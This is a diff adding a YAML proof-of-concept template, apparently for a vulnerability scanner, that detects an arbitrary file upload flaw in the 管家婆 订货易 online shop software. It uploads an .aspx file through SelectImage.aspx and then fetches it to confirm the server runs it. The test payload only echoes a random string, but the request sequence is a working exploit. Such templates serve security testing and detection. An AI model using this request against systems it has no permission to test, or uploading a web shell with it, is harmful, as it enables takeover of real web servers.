@@ -1,0 +1,37 @@
+id: poc-yaml-guan-jia-po-ding-hua-yi-online-shopping-mall-selectimage-aspx-anyfile-upload
+info:
+  name: 管家婆 订货易在线商城 SelectImage.aspx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 管家婆订货易
+variables:
+  t1: random_str(4)
+requests:
+- method: POST
+  path: /DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true
+  headers:
+    Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b
+  data: '--532c7611457d40f4ae4cd9422973416b
+
+    Content-Disposition: form-data; name="Filedata"; filename="TEST.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <% Response.Write("{{.t1}}"); %>
+
+    --532c7611457d40f4ae4cd9422973416b--'
+  expression: 'status_code == 200
+
+    && contains(body,"aspx")
+
+    && contains(body,"UploadImage")
+
+    '
+  output:
+  - regex_match(body,"(?P<t2>[0-9_]{19})")
+- method: GET
+  path: /templates/master/pc/fangmeilele/UploadImage/titleimg/{{.t2}}.aspx
+  expression: status_code == 200 && body == t1
+transport: http
